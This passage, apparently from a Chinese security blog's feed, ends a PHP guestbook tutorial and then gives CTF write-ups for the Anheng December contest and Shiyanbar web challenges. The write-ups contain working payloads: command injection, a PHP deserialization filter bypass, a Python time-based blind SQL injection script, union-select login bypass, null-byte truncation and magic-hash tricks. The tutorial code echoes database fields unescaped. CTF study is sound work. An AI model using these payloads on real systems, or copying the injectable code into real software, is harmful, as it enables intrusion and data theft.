class="string">"&lt;script&gt;alert('删除成功');window.location.href='list.php';&lt;/script&gt;"</span>;</span></span><br><span class="line"><span class="php"> &#125;</span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="list-php"><a href="#list-php" class="headerlink" title="list.php"></a>list.php</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>留言查询<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span><span class="tag">&lt;<span class="name">b</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"add.html"</span>&gt;</span>添加留言<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">align</span>=<span class="string">"center"</span> <span class="attr">border</span>=<span class="string">"1"</span> <span class="attr">width</span>=<span class="string">"50%"</span> <span class="attr">rules</span>=<span class="string">"all"</span> <span class="attr">bgcolor</span>=<span class="string">"#CCFF80"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>用户<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>标题<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">"conn.php"</span>);</span></span><br><span class="line"><span class="php">$sql = <span class="string">"select * from message order by id desc"</span>;</span></span><br><span class="line"><span class="php">$query = mysql_query($sql);</span></span><br><span class="line"><span class="php"><span class="comment">//$row = mysql_fetch_array($query);</span></span></span><br><span class="line"><span class="php"><span class="comment">//echo $row['id'];</span></span></span><br><span class="line"><span class="php"><span class="comment">//var_dump($row);</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="keyword">while</span>($row=mysql_fetch_array($query))&#123;  <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"del.php?id=&lt;?php echo $row['id'];?&gt;"</span>&gt;</span>删除留言<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row[<span class="string">'user'</span>]; <span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row[<span class="string">'title'</span>] <span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row[<span class="string">'content'</span>] <span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="php"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>安恒杯12月月赛WP</title>
      <link href="/2018/12/23/%E5%AE%89%E6%81%92%E6%9D%AF12%E6%9C%88%E6%9C%88%E8%B5%9BWP/"/>
      <url>/2018/12/23/%E5%AE%89%E6%81%92%E6%9D%AF12%E6%9C%88%E6%9C%88%E8%B5%9BWP/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><pre><code>这次的月赛可以说非常适合我这种菜鸡做了</code></pre><h2 id="ezweb2"><a href="#ezweb2" class="headerlink" title="ezweb2:"></a>ezweb2:</h2><p>请求包中发现一个user=base64</p><p>解码得到user,构造admin 然后base64提交</p><p>发现跳转到后台admin.php</p><p>试了一个ls发现有回显,应该是个命令执行漏洞</p><p>构造: cmd = ls$IFS/  成功回显</p><p>然后读取flag:  cmd = cat $IFS /ffLAG_404</p><h2 id="easy："><a href="#easy：" class="headerlink" title="easy："></a>easy：</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"><span class="php">@error_reporting(<span class="number">1</span>); </span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span></span><br><span class="line"><span class="php">&#123;   </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span></span><br><span class="line"><span class="php">    &#123;          </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) </span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            $filename = <span class="string">"./&#123;$this-&gt;file&#125;"</span>;        </span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (file_get_contents($filename))         </span></span><br><span class="line"><span class="php">            &#123;              </span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> file_get_contents($filename); </span></span><br><span class="line"><span class="php">            &#125; </span></span><br><span class="line"><span class="php">        &#125;     </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span></span><br><span class="line"><span class="php">&#123; </span></span><br><span class="line"><span class="php">    $data = $_GET[<span class="string">'data'</span>];</span></span><br><span class="line"><span class="php">    preg_match(<span class="string">'/[oc]:\d+:/i'</span>,$data,$matches);</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(count($matches))</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Hacker!'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        $good = unserialize($data);</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> $good;</span></span><br><span class="line"><span class="php">    &#125;     </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="keyword">else</span> </span></span><br><span class="line"><span class="php">&#123; </span></span><br><span class="line"><span class="php">    highlight_file(<span class="string">"./index.php"</span>); </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>本地构造序列化<br>O:4:”baby”:1:{s:4:”file”;s:8:”flag.php”;}</p><p>因为存在过滤出语句<br>preg_match(‘/[oc]:\d+:/i’,$data,$matches);</p><p>所以需要绕过,用加号进行绕过:<br>O:+4:”baby”:1:{s:4:”file”;s:8:”flag.php”;}</p><p>但如果直接传值的话会，服务器接收到会把加号认为空格，所以要对加号url编码：<br>O:%2b4:”baby”:1:{s:4:”file”;s:8:”flag.php”;}</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h2 id="JUJU"><a href="#JUJU" class="headerlink" title="JUJU"></a>JUJU</h2><p> 提示女朋友问我这11只JUJU哪只好看？<br> 图片里没有11只JUJU，用windex改个高度即可<br>然后base32解码得到flag</p><h2 id="学习资料"><a href="#学习资料" class="headerlink" title="学习资料"></a>学习资料</h2><p>zip加密，一般zip加密只有那几种，并且打开zip文件里面还有一个已经给出的txt文件，还有一个经过加密的zip文件，很明显是明文攻击就可以了<br>将txt文件加密为zip文件,然后用ARCHPR进行明文攻击<br>得到一个doc文件打开,得到一个5 3 的图片，把图片移开就可以看到flag了</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CTF实验吧writeup</title>
      <link href="/2018/12/21/CTF%E5%AE%9E%E9%AA%8C%E5%90%A7writeup/"/>
      <url>/2018/12/21/CTF%E5%AE%9E%E9%AA%8C%E5%90%A7writeup/</url>
      
        <content type="html"><![CDATA[<h2 id="实验吧writeup"><a href="#实验吧writeup" class="headerlink" title="实验吧writeup"></a>实验吧writeup</h2><ul><li>看起来有点难分值</li></ul><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考察点:<span class="built_in">sleep</span>()时间盲注</span><br></pre></td></tr></table></figure><p>selete被过滤了,利用slepp()进行时间盲注.关键payload:</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctf5.shiyanbar.com/basic/inject/index.php?admin=admin' <span class="keyword">and</span> <span class="keyword">case</span> <span class="keyword">when</span>(substr(password,<span class="number">1</span>,<span class="number">1</span>)=<span class="string">'i'</span>) <span class="keyword">then</span> sleep(<span class="number">18</span>) <span class="keyword">else</span> sleep(<span class="number">0</span>) <span class="keyword">end</span> <span class="keyword">and</span> '<span class="string">'='</span>&amp;pass=<span class="number">9</span>&amp;action=login</span><br></pre></td></tr></table></figure><p>脚本如下:</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># http://ctf5.shiyanbar.com/basic/inject/index.php?admin=admin' <span class="keyword">and</span> case when(substr(password,<span class="number">1</span>,<span class="number">1</span>)='i') <span class="keyword">then</span> sleep(<span class="number">8</span>) <span class="keyword">else</span> sleep(<span class="number">0</span>) end <span class="keyword">and</span> ''='&amp;pass=&amp;action=login</span><br><span class="line">import requests</span><br><span class="line">import <span class="built_in">time</span></span><br><span class="line">guess = <span class="string">"1234567890-_=+qwertyuioplkjhgfdsazxcvbnm?!@#$%^&amp;*"</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://ctf5.shiyanbar.com/basic/inject/index.php"</span></span><br><span class="line"></span><br><span class="line">flag1 = ''</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> guess:</span><br><span class="line">flag = <span class="string">"admin' and case when(substr(password,%s,1)='%s') then sleep(8) else sleep(0) end and ''='&amp;pass=&amp;action=login"</span><span class="symbol">%</span>(i,j)</span><br><span class="line"></span><br><span class="line">data = &#123;'admin':<span class="string">"flag"</span>&#125;</span><br><span class="line"></span><br><span class="line">timestart = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line"></span><br><span class="line">r = requests.<span class="built_in">get</span>(url,params=flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">time</span>.<span class="built_in">time</span>() - timestart &gt; <span class="number">10</span>:</span><br><span class="line">flag1 = flag1 + j</span><br><span class="line"><span class="built_in">print</span>(j)</span><br><span class="line"><span class="built_in">break</span></span><br></pre></td></tr></table></figure><ul><li>猫抓老鼠</li></ul><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在返回报看到<span class="symbol">:Content-Row</span>: MTU0NTIyNzcyNg==</span><br><span class="line">直接提交即可,不用解密</span><br></pre></td></tr></table></figure><ul><li>头有点大分值</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点<span class="selector-pseudo">:HTTP</span>头</span><br></pre></td></tr></table></figure><ul><li>貌似有点难分值</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点<span class="selector-pseudo">:HTTP</span>头,<span class="selector-tag">XXF</span></span><br></pre></td></tr></table></figure><ul><li>这个看起来有点简单!</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点<span class="selector-pseudo">:SQL</span>注入,</span><br></pre></td></tr></table></figure><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用 <span class="class"><span class="keyword">union</span> 进行注入,没有过滤任何字符</span></span><br></pre></td></tr></table></figure><ul><li>PHP大法分值</li></ul><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">考点<span class="symbol">:php</span>代码审计</span><br><span class="line">试了eregi()弱类型,发现不行</span><br><span class="line">看到<span class="variable">$_GET</span>[id] = urldecode(<span class="variable">$_GET</span>[id]); 尝试二次url编码,成功绕过</span><br></pre></td></tr></table></figure><ul><li>what a fuck!这是什么鬼东西?</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">考点<span class="selector-pseudo">:JSfack</span></span><br><span class="line">全选复制,在浏览器的运行台运行即可</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">考点: php审计 + sql注入</span><br><span class="line">在源码中看到index.txt</span><br><span class="line">关键代码:</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"select pw from php where user='<span class="variable">$user</span>'"</span>;</span><br><span class="line"><span class="variable">$query</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$query</span>, MYSQL_ASSOC);</span><br><span class="line">//<span class="built_in">echo</span> <span class="variable">$row</span>[<span class="string">"pw"</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> ((<span class="variable">$row</span>[pw]) &amp;&amp; (!strcasecmp(<span class="variable">$pass</span>, <span class="variable">$row</span>[pw]))) &#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;p&gt;Logged in! Key:************** &lt;/p&gt;"</span>;</span><br><span class="line">这里取一条结果集进行验证,可使用union select 构造一条结果集来绕过</span><br><span class="line">payload:</span><br><span class="line">1<span class="string">'union select md5(1) #</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">不理解可以自己搭建环境试试</span></span><br></pre></td></tr></table></figure><ul><li>NSCTF web200</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">考点:写脚本能力</span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">        $_=<span class="string">""</span>;</span></span><br><span class="line"><span class="php">        $str = <span class="string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws "</span>;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">        $str = str_rot13($str);</span></span><br><span class="line"><span class="php">        $str = strrev($str);</span></span><br><span class="line"><span class="php">        $str = base64_decode($str);</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($str); $i++)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            $_c = substr($str,$i,<span class="number">1</span>);</span></span><br><span class="line"><span class="php">            $__ = ord($_c)<span class="number">-1</span>;</span></span><br><span class="line"><span class="php">            $_c = chr($__);</span></span><br><span class="line"><span class="php">            $_ .=$_c;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> strrev($_);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><ul><li>上传绕过</li></ul><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点:文件上传,<span class="comment">%00截断</span></span><br></pre></td></tr></table></figure><ul><li>FALSE</li></ul><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">考点: hsah1 碰撞</span></span><br><span class="line">可以直接传数组和md5碰撞一样的解法</span><br></pre></td></tr></table></figure><ul><li><p>Guess Next Session</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">考点：<span class="keyword">http</span> cookie</span><br><span class="line">直接将cookie清除即可</span><br></pre></td></tr></table></figure></li><li><p>Once More</p></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">'password'</span>]) &lt; <span class="number">8</span> &amp;&amp; $_GET[<span class="string">'password'</span>] &gt; <span class="number">9999999</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'*-*'</span>) !== <span class="keyword">FALSE</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span>(<span class="string">'&lt;p&gt;*-* have not been found&lt;/p&gt;'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'&lt;p&gt;Invalid password&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">考点:考察php及即弱类型</span><br><span class="line">当php遇到数字加e 的时候被认为是科学技术法，</span><br><span class="line">ereg()存在%00截断即遇到%00的时候被认为是匹配结束</span><br><span class="line">payload:</span><br><span class="line">1e8%00*-*    //注意在地址栏提交,不然%00会被url编码</span><br><span class="line"><span class="link">http://ctf5.shiyanbar.com/web/more.php?password</span>[<span class="string"></span>]=99999999 //也可以利用数组,ereg()只能处理字符串,数组的话,被认为为NULL</span><br></pre></td></tr></table></figure><ul><li>忘记密码了</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">考点: 源码泄露</span><br><span class="line"></span><br><span class="line">打开网址 查看源码 注意</span><br><span class="line">&lt;meta name=<span class="string">"editor"</span> content=<span class="string">"Vim"</span> /&gt;</span><br><span class="line">VIM编辑器:当进行文件编辑时，如果非正常退出会产生一个 .文件名.swp</span><br><span class="line">upload/.step1.php.swp  发现不行,于是抓包,发现跳转到step2 然后发送给submit.php</span><br><span class="line">访问.submit.php.swp 成功获得源码</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($token)&amp;&amp;!<span class="keyword">empty</span>($emailAddress))&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line"><span class="keyword">if</span>($token!=<span class="string">'0'</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line">$sql = <span class="string">"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"</span>;</span><br><span class="line">$r = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'db error'</span>);</span><br><span class="line">$r = mysql_fetch_assoc($r);</span><br><span class="line">$r = $r[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>($r&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"澶辫触浜嗗憖"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">1.</span>要求token的长度为<span class="number">10</span>且值为<span class="number">0</span></span><br><span class="line">利用科学技术法<span class="number">0e00000000</span></span><br><span class="line"><span class="number">2.</span>要求$emailAddress的值为管理员邮箱</span><br><span class="line">step1源码中已给出</span><br><span class="line">payload:</span><br><span class="line">submit.php?emailAddress=admin@simplexue.com&amp;token=<span class="number">0e00000000</span></span><br></pre></td></tr></table></figure><ul><li><p>天网管理系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">考点: php弱类型 php反序列化</span><br><span class="line">查看源码, 发现&lt;!-- <span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">'username'</span>]; <span class="variable">$test</span>=md5(<span class="variable">$test</span>); <span class="keyword">if</span>(<span class="variable">$test</span>==<span class="string">'0'</span>) --&gt;</span><br><span class="line">php中的 == 为弱等于号 当比较类型不一样时会进行转换比如 <span class="string">'1'</span> == <span class="string">'1dfsgdfsg'</span> 结果为Ture</span><br><span class="line">因此只要找到一个字符串加密结果开头为0的即可</span><br><span class="line">数组也应该拿可以绕过,还没试过</span><br><span class="line">回显得到/user.php?fame=hjkleffifer</span><br><span class="line">访问得到:</span><br><span class="line"><span class="variable">$unserialize_str</span> = <span class="variable">$_POST</span>[<span class="string">'password'</span>]; </span><br><span class="line"><span class="variable">$data_unserialize</span> = unserialize(<span class="variable">$unserialize_str</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data_unserialize</span>[<span class="string">'user'</span>] == <span class="string">'???'</span> &amp;&amp; <span class="variable">$data_unserialize</span>[<span class="string">'pass'</span>]==<span class="string">'???'</span>) </span><br><span class="line">&#123; </span><br><span class="line">print_r(<span class="variable">$flag</span>); </span><br><span class="line">&#125; 伟大的科学家php方言道：成也布尔，败也布尔。 回去吧骚年</span><br><span class="line"></span><br><span class="line">看源码应该是php反序列</span><br><span class="line">对password进行序列化</span><br><span class="line">a:2:&#123;s:4:<span class="string">"user"</span>;b:1;s:4:<span class="string">"pass"</span>;b:1;&#125;</span><br></pre></td></tr></table></figure></li><li><p>Forms</p></li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查看源码，发现:</span><br><span class="line">&lt;input <span class="attribute">type</span>=<span class="string">"hidden"</span> <span class="attribute">name</span>=<span class="string">"showsource"</span> 